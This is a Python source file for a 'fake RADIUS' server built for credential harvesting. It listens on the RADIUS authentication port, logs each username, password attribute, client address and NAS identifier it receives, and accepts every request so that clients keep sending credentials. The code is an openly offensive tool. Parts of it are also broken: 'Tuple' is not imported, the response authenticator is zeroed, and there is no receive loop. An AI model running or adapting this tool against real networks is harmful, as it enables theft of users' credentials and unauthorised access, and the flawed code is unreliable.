"""
Fake RADIUS Server
==================
RADIUS protocol server for credential capture.

Accepts authentication requests and logs credentials
without validating against a real backend.
"""

import socket
import struct
import time
from typing import Dict, List, Any, Optional
from dataclasses import dataclass, asdict


@dataclass
class RADIUSCredential:
    """Captured RADIUS credential."""
    username: str
    password_hash: str
    client_ip: str
    nas_identifier: str
    timestamp: float


class FakeRADIUS:
    """Fake RADIUS server for credential harvesting."""

    RADIUS_AUTH_PORT = 1812
    RADIUS_CODE_ACCESS_REQUEST = 1
    RADIUS_CODE_ACCESS_ACCEPT = 2
    RADIUS_CODE_ACCESS_REJECT = 3

    def __init__(self, listen_addr: str = "0.0.0.0", port: int = 1812,
                 shared_secret: str = "testing123"):
        self.listen_addr = listen_addr
        self.port = port
        self.shared_secret = shared_secret
        self._running = False
        self._server_sock: Optional[socket.socket] = None
        self.credentials: List[RADIUSCredential] = []
        self.stats = {"requests": 0, "accepted": 0, "rejected": 0}

    def start(self) -> bool:
        """Start RADIUS server."""
        try:
            self._server_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self._server_sock.bind((self.listen_addr, self.port))
            self._running = True
            return True
        except Exception as e:
            print(f"[RADIUS] Start error: {e}")
            return False

    def handle_packet(self, data: bytes, addr: Tuple[str, int]) -> None:
        """Handle incoming RADIUS packet."""
        if len(data) < 20:
            return

        code = data[0]
        packet_id = data[1]
        length = struct.unpack(">H", data[2:4])[0]
        authenticator = data[4:20]

        if code != self.RADIUS_CODE_ACCESS_REQUEST:
            return

        self.stats["requests"] += 1

        # Parse attributes
        attributes = self._parse_attributes(data[20:])
        username = attributes.get(1, "")
        password = attributes.get(2, "")
        nas_id = attributes.get(32, "")

        if username:
            cred = RADIUSCredential(
                username=username,
                password_hash=password,
                client_ip=addr[0],
                nas_identifier=nas_id,
                timestamp=time.time(),
            )
            self.credentials.append(cred)

        # Build response (accept all for credential capture)
        response = self._build_response(
            self.RADIUS_CODE_ACCESS_ACCEPT,
            packet_id,
            authenticator,
            attributes,
        )
        self._server_sock.sendto(response, addr)
        self.stats["accepted"] += 1

    def _parse_attributes(self, data: bytes) -> Dict[int, str]:
        """Parse RADIUS attributes."""
        attrs = {}
        i = 0
        while i < len(data):
            if i + 2 > len(data):
                break
            attr_type = data[i]
            attr_len = data[i + 1]
            if i + attr_len > len(data):
                break
            attr_value = data[i + 2:i + attr_len]
            attrs[attr_type] = attr_value.decode("utf-8", errors="ignore")
            i += attr_len
        return attrs

    def _build_response(self, code: int, packet_id: int,
                       request_auth: bytes, attrs: Dict[int, str]) -> bytes:
        """Build RADIUS response packet."""
        response_auth = b"\x00" * 16  # Simplified
        attr_data = b""
        for attr_type, value in attrs.items():
            if attr_type in (1, 32):  # Include username and NAS ID
                attr_data += bytes([attr_type, len(value) + 2]) + value.encode()

        packet = bytes([code, packet_id]) + struct.pack(">H", 20 + len(attr_data))
        packet += response_auth + attr_data
        return packet

    def get_credentials(self) -> List[Dict[str, Any]]:
        """Get captured credentials."""
        return [asdict(c) for c in self.credentials]

    def stop(self) -> None:
        """Stop RADIUS server."""
        self._running = False
        if self._server_sock:
            self._server_sock.close()

    def get_stats(self) -> Dict[str, int]:
        """Return RADIUS statistics."""
        return {**self.stats, "total_credentials": len(self.credentials)}
